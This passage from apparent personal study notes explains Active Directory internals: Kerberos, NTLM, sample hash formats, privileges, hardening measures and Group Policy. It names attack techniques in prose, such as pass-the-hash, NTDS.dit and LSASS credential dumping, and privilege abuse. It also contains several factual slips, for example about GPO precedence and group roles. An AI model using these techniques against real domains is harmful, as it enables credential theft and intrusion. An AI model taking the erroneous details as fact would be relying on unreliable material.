objects organized into container objects. Every domain has a separate database and a sets of policies.Domain ControllersAre the brains of the AD. They handle authentication requests, verify users on the network, control who can acces de resources, etc. All access requests are validated via de domain controller.SitesSites are a set of computers connected using links.Built-inThis is a container that has all the default groups and configurations.Foreign Security PrincipalsAn FSP is an object which is a security principal from a trusted external forest. They are created whenever a user/group/computer from another forest is added into a grup in the current domain. This object holds a SID that is used to reslove the object’s name via the trust relationship. FTP objects are created ina specific container named ForeignSecurityPrincipals.Important ProtocolsActive Directory requires Lightweight Directory Access Protocol (LDAP), Kerberos, DNS and MSRPC (A microsoft implementation of Remmote Procedure Call (RPC)).KerberosKerberos is an authentication protocol and Windows servers use them since 2000. Kerberos protocol is based on tickets and doesn’t depend on transmitting passwords and usernames. Kerberos protocol needs a Key Distribution Center (KDC) to issue the tickets. Domain Controllers have this KDC and when a user initiates a login request (AS-REQ), the client requests a ticket from the KDC. The request is NTLM encrypted with the user password hash. KDC also has the password so it will be able to decrypt the AS-REQ using it. Then, the KDC will create Ticket Granting Ticket (TGK) and give it to the user. This TGK can be used to request a Ticket Granting Service (TGS), but since the Domain Controlled is the one that issues TGS, user has to send the TGK to the DC along with the service they want to use (encrypted with the associated NTLM password hash). Once the client has the TGS, the service can be used.Let’s take a deep look at this protocol with an image: Authentication Service Request This is the first step and is where the client asks to de KDC for the Ticket Granting Ticket. To do this, the client sends the KRB_AS_REQ message to the KDC. This message has (among others): An encrypted timestamp (with the user private key) to authenticate the user. This is only necessary if the user requires preauthentication. If the attribute DONT_REQ_PREAUTH is set, it won’t be necessary. The username of the authenticated user A nonceOnce the KDC recieves this message, it will search to its database the username and obtain the used associated private key (NTLM hash). Once the KDC has the user private key, it will be able to decrypt the Timestamp and validate the user. Authentication Service Response Now, KDC will build a new message to give a response. This message is the KRB_AS_REP. This message has several contents: The Username Encrypted data (encrypted with the user private key) which contains: Session key (this key is a temporal key created with the KDC after the first step). Expiration date of the TGT The user nonce (to prevent reply attacks). The Ticket Granting Ticket (TGK). This ticket is encrypted with a key shared between the AS and the TGS, so the user can’t see the contents of this ticket: Username Session key Expiration date of the TGT PAC (contains the user privileges and other info (SID, groups, etc.) Once the user recieves this message, is able to decrypt the encrypted data and obtain the Session key and the nonce. This will also authenticate the KDC so the user can trust that ticket. TGS Request Since the user has a TGT, it can be used agains the Ticket Granting Server to obtain another ticket (Ticket Grantig Service or TGS). Whenever the user wants to use a service, it will send a KRB_TGS_REQ to the Ticket Granting Server. This message has the following content: Encrypted with the session key (remember that the user can retrieve the session key because it was inside the KRB_AS_REP message encrypted with its private key): Username Timestamp The TGT (The user can’t see its content but can use the ticket) Service Principal Name of the service requested. A nonce generated by the user. Since the Ticket Granting Server is able to decrypt the TGT and see it’s content (specified at the second step Authentication Service Response) it will obtain the session key. The session key allows the decryption of the first message and authenticate the validity of the message checking both timestamps and usernames. TGS Response If the validity of the previous step has been succesfull, the Ticket Granting Server will sent back to the user a KRB_TGS_REP message that contains: Username TGS (Encrypted with a key that only the Ticket Granting Server and the service share): Service session key (A key that will be used between the client and the service) Username Expiration date of TGS PAC Encrypted data (with the session key) Service session key Expiration date of the TGS The user nonce. Like the second step, the user will be able to decrypt de data and retrieve the service session key and the nonce, that will validate the message. Service Request Now that the user has decrypted the encrypted data using the session key, the Service session key can be used to craft the new message, the KRB_AP_REQ, to the service. This message contains: The TGS (that the user is not able to decrypt) Encrypted data (using the service session key): Username Timestamp The service will be able to decrypt the TGS, obtain the service session key, and decrypt the data in order to check the validity. If it is valid, the server will respond with a KRB_AP_REP and the client will be able to use the service. Kerberos protocol runs on port 88, so we can locate domain controlers by searching for open port 88.DNSActive Directory Domain Services (AD DS) uses DNS to facilitate the communication within de domain. This protocol is used to resolve hostnames to IP addresses.AD has a database of services running on the network represented using service records (SRV) and the clients can locate them easily. When a client joins the network, it locates the Domain Controler by sending a query to the DNS service, retrieving the SRV of the Domain Controller and discovering the Domain Controller hostname. Then the client uses the hostname to obtain the IP addres.DNS protocol uses port 53 and TCP or UDP (UDP by default but it uses THC when UDP messages are larger than 512 bytes).Using the nslookup comand we can do Forward DNS Lookup or Reverse DNS Lookup. Forward DNS Lookup with a name will give you the IP address (If you use a hostname, you will get its IP address, if you use a domain name, you will get the domain controller). Reverse DNS Lookup with an IP will give you the hostname.LDAPLightweight Directory Acces Protocol allows directory lookups. It uses port 389 but LDAP over SSL (LDAPS) uses port 636. LDAP is used for the applications to communicate with other servers that provide directory services. An LDAP session begins connecting to the LDAP server (Driectory Sistem Agent). The Domain Controller in the AD is listening for LDAP requests such as authentication requests.There are two types of LDAP authentication: \t1. Simple Authentication\t: It includes anonymous authentication, unauthenticated authentication and username/password authentication. \t2. SASL Authentication: \t: Simple Authentication and Security Layer framework uses other authentication services (such as Kerberos) to bind to the LDAP server. The LDAP server uses the LDAP protocol to send a LDAP message to the authorization service and it initiates challenges/response messages resulting in a authentication.LDAP messages are send in cleartext by default, but you can use TLS encryption to protect the trafic.MSRPCThis is the Microsoft implementation of the Remote Procedure Call. Windows systems uses four RPC interfaces: lsarpc: Several RPC calls to the LSA (local Security Authority) wich manages local security policy on a computer, controls audit policy and provides interactiva authentication. It is used to perform management on domain security policies. netlogon: Is a windows process used to authenticate users and services in the domain environment. It is allwais being executed in the background samr: Remote SAM allows to manage the domain account database, storing information about users and groups. Attackers use the samr protocol to perform reconnaissence about the internal domain ussing tools like BloodHound. A good protection against it is to change the Windows registry key to only allow administrators to perform remote SAM queries (by thefault, all authenticated users can do SAM queries) drsuapi: This is the Microsoft API that implements the Directory Replication Service (DRS) Remote protocol which is used to perform replication-related tasks in a multi-DC environment. Attackers use this to create a copy of the AD domain database (NTDS.dit) to retrieve password hashes for all accounts.NTLM AuthenticationActive Directory uses other authentication methods asida from Kerberos and LDAP, like NTLMv1 and NTLMv2. This protocols use the NTLM and the LM hash.LMLAN Manager (LM) is a old mechanism used by Windows to store passwords. If the system uses them, they are stored in the SAM database (if we are talking about a normal Windows host) or in the NTDS.DIT (if we are talking about a DC). Since the security algorithim has been broken, this hash has been turned off by default since Windows Vista/Server 2008. The passwors that use LM can be maximum 14 charecters long and they are not case sensitive (converted to uppercase before the hash). This makes them relatively easy to crack. If the password is less than 14 characters, it is padded with NULL characters. The 14 characters are splitted in two chunks and encrypted using the string KGS!@#$% creating two 8 byte values. These values are concatenated together creating the LM hash.NTHash (NTLM)NT LAN Manager (NTLM) hashes are the ones used now. It is based on a challenge-response authentication protocol and uses three messages to authenticate: The client sends a NEGOTIATE_MESSAGE to the server The response is a CHALLENGE_MESSAGE to verify the client’s identity. The client responds with an AUTHENTICATE_MESSAGE.These hashes are stored locally in the SAM (if talking about a normal Windows host) or in the NTDS.DIT (if talking about the DC). The protocol has two possible hashed password values: the LM hash or the NT hash. The NT hash uses the MD4 algorithim of the little-endian UTF-16 value of the password: MD4(UTF-16-LE(password)).They are stringer than LM hashes but they can also be brute forced. NTLM is allso vulnerable to the pass-the-hash attack, where an attacker just uses the NTLM hash to authenticate to other systems where the user is local admin, instead of needing the cleartext password. A NTLM hash looks like:Adri:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::And it contains: Adri: Is the username 500: Is te RID. The 500 RID is the administrator account. aad3c435b514a4eeaad3b935b51304fe: Is the LM hash. If they are disabled, this value is worthless. e46b9e548fa0d122de7f59fb6d48eaa2: This is the NT hash. It can be cracked offline or used for a pass-the-hash.The Crack Map Execc tool can be used to do a pass-the-hash attack.NTLMv1 (Net-NTMLv1)NTLMv1 uses NT and LM hashThe server sends to the client an 8-byte random number (which is tha challenge) and the client returns a 24-byte response. They can NOT be used for pass-the-hash attacks. An example of the challenge-response:X = 8-byte challenge from the serverK1 | K2 | K3 = LM/NT-hash | 5-bytes-0response = DES(K1,X) | DES(K2,X) | DES(K3,X)NTLMv1 hash example: u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736cNTLMv2 (Net-NTLMv2)It is a stronger version of the NTLMv1. NTLMv2 sends two responses to an 8-byte server challenge. Each response contains a 16-byte HMAC-MD5 hash of the server challenge (SC), a fully/partially randomly generated client challenge (CC), and an HMAC-MD5 hash of the user’s password and other identifying information (v2-Hash). The two responses differ in the format of the client challenge (CC and CC*). The shorter response uses an 8-byte random value for this challenge. In order to verify the response, the server must receive as part of the response the client challenge. For this shorter response, the 8-byte client challenge appended to the 16-byte response makes a 24-byte package which is consistent with the 24-byte response format of the previous NTLMv1 protocol.:SC= 8-byte server challenge CC = 8-byte client challenge, randomCC*= (X,time, CC2, domain name)v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)LMv2 = HMAC-MD5(v2-Hash, SC, CC) (1 response message)NTv2 = HMAC-MD5(v2-Hash, SC, CC*) (2nd response message)response = LMv2 | CC | NTv2 | CC*NTLMv2 hash example: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030Domain Cached Credentials (MSCache2)DCC is a protocol that doesn’t need the the client to communicate with a domain controller. Hosts stores the last 10 hashes for any domain users that log into the machine in the HKEY_LOCAL_MACHINE\\SECURITY\\Cache registry key. This hashes are hard to crack but they can be obtained once the attacker has admin acces to the machine. It looks like this:$DCC2$10240#adri#e4e938d12fe5974dc42a90120bd9c90fAccountsThere are accounts on local systems and in Active Directory to give a user/program the ability to log on and acces resources based on their rights. When a user logs in successfully, the system creates an acces token that describes the security content of a process/thread and the user’s security identity and group membership. Users can be assigned to groups that can contain one or more members. This groups allows an easier management of access controls because they only need to be assigned to the group instead of assigning them to each user. Usually, in the AD each user will have one user account, however some user can have different users (workers with different roles or processes). It is also common to have disabled accounts for audit purposes. User accounts present an immense attack surface and are usually a key focus for gaining a foothold during a penetration test. Users are often the weakest link in any organization.Local AccountsLocal accounts are stored locally on a particular server/workstation. This accounts are considered security principals but can only manage acces on the standalone host. There are several default local user accounts: Administrator: This account has the SID S-1-5-domain-500. It has full controll and it can’t be deleted or locked but it can be disabled and renamed. Since Windows 10 and Sercer 2016 it is disabled by default. Guest: This account is also disabled by default. The purpose of this account is to allow users without an account on the computer to log in temporarily with limited access rights. SYSTEM or NT AUTHORITY\\SYSTEM: This is the default account and is the one used by the operating system to perform internal functions. SYSTEM is a service account and does not run entirely in the same context as a regular user. Many of the processes and services running on a host are run under the SYSTEM context. It can’t be added to any groups. Network Service: This is a predefined local account used by the Service Control Manager (SCM) for running Windows services. When a service runs in the context of this particular account, it will present credentials to remote services. Local Service: This is another predefined local account used by the Service Control Manager (SCM) for running Windows services. It is configured with minimal privileges on the computer and presents anonymous credentials to the network.Domain UsersDomain users are granted rights from the domain to access resources such as file servers, printers, intranet hosts, etc (based on the permissions granted). This users can log in to any host in the domain (unlike local users). One important account is the KRBTGT. This account is a type of local account and acts as a service account for the Key Distribution service. It is a common target for attackers since gaining control or access will enable an attacker to have unconstrained access to the domain.User Naming AttributesThis attributes can be used to improve security: UserPrincipalName (UPN): This is the main logon name for the user, by convention uses the email address. ObjectGUID: Unique identifier of the user. It never changes and remains even if the used is removed. SAMAccountName: This is a logon name that supports the previous version of Windows clients and servers. objectSID: This is the user SID. This attribute identifies a user and its group memberships during security interactions with the server. sIDHistory: It contains the previous SIDs for the user object when moved from another domain. After a migration occurs, the last SID will be added to the sIDHistory property, and the new SID will become its objectSID.Domain-joined vs. Non-Domain-joined MachinesThere is a difference between a host that is inside the domain and a host that is only in a workgroup.Domain joinedA host joined to a domain will acquire any configurations or changes necessary through the domain’s Group Policy. It can acces and log in to any resources from ani host in the domain.Non-domain joinedThis computers are in a workgroup and are not managed by any domain policy. The advantage of this setup is that the individual users are in charge of any changes they wish to make to their host. Users created there only exist in that host and profiles are not migrated to other hosts within the workgroup.Having a NT AUTHORITY\\SYSTEM level access will have similar rights as a standar domain user in the AD environment. This important because it allows to read data within the domain anf gather information.AD GroupsGroups are usefull because they can place similar users together and mass assign rights and acces to them. The difference between groups and OUs is that groups are used to assign permissions to access resources while OUs can also be used to delegate administrative tasks to a user without giving them additional admin rights.Groups types and scopesGroups have two fundamental characteristics: group type: defines the group purpose (security or distribution). Security groups are for assigning permissions and rights while the distribution groups are used by email apps to distribute messages to all group members. group scope: shows how the group can be used within the domain or forest. There are three diferent scopes: Domain Local Group: This groups can only be used to manage permissions to domain rosources that exists in the domain where it was created. They can’t be used in other domains but they can contain users from other domains. Local groups can be nested into (contained within) other local groups but not within global groups. Global Group: This groups can be used to frant access to resources in another domain. It can only contain accounts from the domain where it was created. They can be nested inside other Global Groups or Local Groups. Universal Group: This groups can be used to manage resources distributed across multiple domainds and have permissions to any object within the same forest. Unlike the other groups, they are stored in the Global Catalog (GC). It is recommended that administrators maintain other groups (such as global groups) as members of universal groups because global group membership within universal groups is less likely to change than individual user membership in global groups. If a user is changed inside a global group, the replication will be only triggered at a domain level, however, if they where directly inside the universal group, the replication will imply all the forest (and create network overhead). There are built-in security groups and only users can be added to these groups. One example is the Domain Admins group, which is a Global security group.Nested GroupsAs mentioned previously, a Domain Local Group can be member of another Domain Local group. The privileges will be inherited and this can lead to some unintended privileges. BloodHound is a tool that helps to detect unwanted privileges.Group AttributesLike users, groups have several attributes, the most important ones are: cn: Or Common-Name is the name of the group. member: All the user, groups and contact objects that are members of the group. groupType: An integrer to specify group type and scope. memberOf: List of any groups that contain this group. objectSid: The security indentifier of the group (the value that identify the group as a security principal).Active Directory Rights and PrivilegesA Right is assigned to users or groups to access an object such as a file. A Privilege grant a user permission to perform an action such as executing something, shuting down a system, etc. Privileges can be assigned individually to a user or assign them via a group membership.##Built-in AD GroupThis are some of the most common built-in groups (default security groups that AD contains): Group Name Description Account Operators Members can create and modify almost all accounts (users, local and global groups, etc.) except the Administrator account, administrative user accounts nor members of the administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Administrators Members of this group have full access to any computer and the entire domain. Backup Operators Members can backup and restore all files (regardless file permissions). They can also log on and shut down computers, and DC. They can make shadow copies of the SAM/NTDS db. DnsAdmins Members have acces to DNS information. This group is only created if the DNS server role has been installed. Domain Admins Members can administer the domain and are members of the local administrator’s group an al the domain-joined machines. Domain Computers Any computers created in the domain (aside from domain controllers) are added to this group. Domain Controllers It contains al the DCs Domain Guests This group includes the domain’s built-in Guest account. Members of this group have a domain profile created when signing onto a domain-joined computer as a local guest. Domain Users It contains all users in a domain. Enterprise Admins This group only exists in the root domain of the AD forest. Members in this group are granted the ability to make forest-wide changes such as adding a child domain or creating a trust. The Administrator account for the forest root domain is the only member of this group by default. Event Log Readers Members can read event logs on local computers. Group Policy Creator Owners Members of this group can create, edit and delete GPO in the domain Hyper-V Administrators Members have complete access to all features in Hyper-V. They should be considered Domain Admins if they are inside a virtual DC. IIS:IUSRS This is a built-in group used by Internet Information Services (IIS), beginning with IIS 7.0. Pre–Windows 2000 Compatible Access This group exists for backward compatibility for computers running Windows NT 4.0 and earlier. Print Operators Members can control printers. They can log on the DC locally. Read-only Domain Controllers It contains all the read-only DCs Read-only Domain Controllers Grants users and groups permission to connect using RDP. Remote Management Users This group can be used to grant users remote access to computers via Windows Remote Management (WinRM) Schema Admins Members can modify the AD scheme. It only exists in the root domain of the forest and the Administrator account for the forest root domain is the only member of this group by default. Server Operators This group only exists on domain controllers. Members can modify services, access SMB shares, and backup files on domain controllers. By default, this group has no members. User RightsDepending on thir group membership, users can have various rights assigned to them. This are some important examples: Privilege Description SeRemoteInteractiveLogonRight It gives to the user the right to log on using RDP SeBackupPrivilege It grants the ability to create system backups. It can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file. SeDebugPrivilege This allows a user to debug and adjust the memory of a process. With this privilege, attackers could utilize a tool such as Mimikatz to read the memory space of the Local System Authority (LSASS) process and obtain any credentials stored in memory. SeImpersonatePrivilege This privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\\SYSTEM. SeLoadDriverPrivilege A user with this privilege can load and unload device drivers that could potentially be used to escalate privileges or compromise a system. SeTakeOwnershipPrivilege SeTakeOwnershipPrivilege If we want to see the privileges that the user has, after logging into the host, we can use the command whoami /priv to obtain a list of all user rights. Some rights are only for administrative users. Even if we have a domain account, if we are using a non-elevated console, the rights will also be very restricted. This is because, by default, Windows systems do not enable all rights to us unless we run the CMD or PowerShell console in an elevated context. This is controlled by the User Account Control (UAC). If we execute the whoami /priv in a elevated console we will se several new privileges.Hardening MeasuresSince AD is not secure by default, it is important to add some hardening measures to protect the AD.LAPSThe **Local Administrator Password Solution (LAPS) is a free software that provides a centralized management of the local accounts passwords in the AD protected with an ACL. It randomize the passwords of local administrator accounts and it allows some users to retrieve them using GPOs.Group Policy Security SettingsGroup Policy Objects (GPOs) are virtual collections of policy settings that can be applied to specific users, groups, and computers at the OU level. The following list shows some types of security policies that can be applied: Account Policies: They manage how user accounts interact with the domain. They include password policy, account lockout policy, and Kerberos-related settings. Local Policies: This policies are applyed to a specific computer and include the security event audit policy, user rights assignments (user privileges on a host), and specific security settings such as the ability to install drivers, whether the administrator and guest accounts are enabled, renaming the guest and administrator accounts, preventing users from installing printers or using removable media, and a variety of network access and network security controls. Software Restriction Policies: They control what software can be run on a host. Application Control Policies: They controll what applications can be run by a specific user/host. Advanced Audit Policy Configuration: A variety of settings that can be adjusted to audit activities such as file access or modification, account logon/logoff, policy changes, privilege usage, and more.Update Manafement (SCCM/WSUS)The Windows Server Update Service is a software that can be installed as a role at any Windows Server and it helps to automatyze the task of patching Windows. The **System Center Configuration Manager is a paid solution that uses WSUS but has more functionalities.Group Managed Service Accounts (gMSA)A gMSA is an account managed by the domain that offers a higher level of security than other types of service accounts for use with non-interactive applications, services, processes, and tasks that are run automatically but require credentials to run. They provide automatic password management with a 120 character password generated by the domain controller. The password is changed at a regular interval and does not need to be known by any user. It allows for credentials to be used across multiple hosts.Security GroupsThis groups offer acces to network resources. AD creates some default security groups as mentioned in the previous charapter.Account SeparationThis measure consist about admins having separate accounts, one for their day-to-day work and another one, with privileges, for whenever they have to do a specific task that requires privileges.Limiting Domain Admin Account UsageThe Domain Admin accounts should only be used to log in into the DC. This would ensure that Domain Admin account passwords are not left in memory on hosts throughout the environment.Periodically Auditing and Removing Stale Users and ObjectsIt’s important to audit the AD and remove unused accounts to reduce the attack surface.Audit Permissions and AccesOrganizations should also periodically perform access control audits to ensure that users only have the level of access required for their day-to-day work.LoggingIt is important to Log all the anomalous activity and important changes that take place within the AD.Restricted GroupsRestricted Groups is a group policy that can be used to control the membership of the groups. They can be used for a number of reasons, such as controlling membership in the local administrator’s group on all hosts in the domain by restricting it to just the local Administrator account and Domain Admins and controlling membership in the highly privileged Enterprise Admins and Schema Admins groups and other key administrative groups. Restricted groups allow an administrator to define the following two properties for security-sensitive (restricted) groups: Members Members OfThe Members list defines who should and shouldn’t belong to the restricted group. The Member Of list specifies which other groups the restricted group should belong to.Limiting Server RolesIt is important not to install additional roles on sensitive hosts, such as installing the Internet Information Server (IIS) role on a Domain Controller. This would increase the attack surface of the Domain Controller, and this type of role should be installed on a separate standalone web server.Limiting Local Admin and RDP RightsOrganizations should tightly control which users have local admin rights on which computers. As stated above, this can be achieved using Restricted Groups. The same goes for Remote Desktop (RDP) rights. If many users can RDP to one or many machines, this increases the risk of sensitive data exposure or potential privilege escalation attacks, leading to further compromise.Group Policy in depthGPOsAs mentioned in previous chapters, Group Policy Object is a virtual collection of policy settings that can be applied to user(s) or computer(s). Each GPO has a unique name and unique GUID and they can be linked to multiple containers. Some typical uses of GPOs include: Define password policies. Prevent the use of removable media devices Enforcing a screensaver with a password Restricting acces to applications that a standar user may not need (cmd.exe and PowerShell) Enforce logging policies Deploying software across a domain Blocking users from installing unapproved software Disallowing LM hash usage in the domain Runing scripts when computer start/shutdown or when users log in/out to their machine. etc.GPO settings are processed using a hierarchical structure of AD and are applied using the *Order of Precedence rule. This rule defines several levels: Local Group Policy: This policies are defined directly to the host. They will be overwritten for settings at a higher level. Site Policy: Any policies specific to the Enterprise Site that the host resides in. Domain-wide Policy: Any settings you wish to have applied across the domain as a whole. For example, setting the password policy complexity level, configuring a Desktop background for all users, and setting a Notice of Use and Consent to Monitor banner at the login screen. Organizational Unit (OU): These settings would affect users and computers who belong to specific OUs. You would want to place any unique settings here that are role-specific. Any OU Policies nested within other OU’s: Settings at this level would reflect special permissions for objects within nested OUs.A GPO attached to a specific OU would have precedence over a GPO attached at the domain level because it will be processed last and could run the risk of overriding settings in a GPO higher up in the domain hierarchy. The Default Domain Policy is the default GPO that is automatically created and linked to the domain. It has the highest precedence of all GPOs and is applied by default to all users and computers. The next picture shows the precedence order and how GPO are applied .When more than one GPO is linked to the same OU, they are processed based on the Link Order. The GPO with the lowest Link Order is processed last, or the GPO with link order 1 has the highest precedence, then 2, and 3, and so on. Is it possible to specify the Enforced option to enforce settings in a GPO. This means that other policy settings CAN’T override other settings. Is it also possible to apply the Block Inheritance at a OU level to avoid aplying policies from higher elements of the precedence level.Group Policy Refresh FrequencyWindows performs periodic Group Policy updates, which by default is done every 90 minutes with a randomized offset of +/- 30 minutes for users and computers. The period is only 5 minutes for domain controllers to update by default. When a new GPO is created and linked, it could take up to 2 hours (120 minutes) until the settings take effect. It is possible to change the default refresh interval within Group Policy itself. Furthermore, we can issue the command gpupdate /force to start the update process.Security Considerations of GPOsWhen a user has the rights to modify a GPO that applies to an OU where the used is contained, several attacks are possible. They may include adding additional rights, adding a local admin to a host, installing malware, etc." }, { "title": "Welcome", "url": "/posts/wellcome/", "categories": "Information", "tags": "", "date": "2022-06-18 08:10:00 +0200", "snippet": "Welcome to my site. I’m Adrià Pagès and I love learning. The purpose of this blog is to centralize all notes, walkthroughs, and summaries that I create so it’s easier to locate whatever I need.My principal interests are related to Cybersecurity so you are going to find summaries related to whatever I decide to study (Certifications, specific topics or vulnerabilities, etc.)If anything I write can be profitable and help you understand or do something, I’m glad to have helped. Lastly, I would appreciate any suggestions or comments as long as they are constructive, so feel free to contact me (contact information is available onthe left panel).Adri :)" } ]
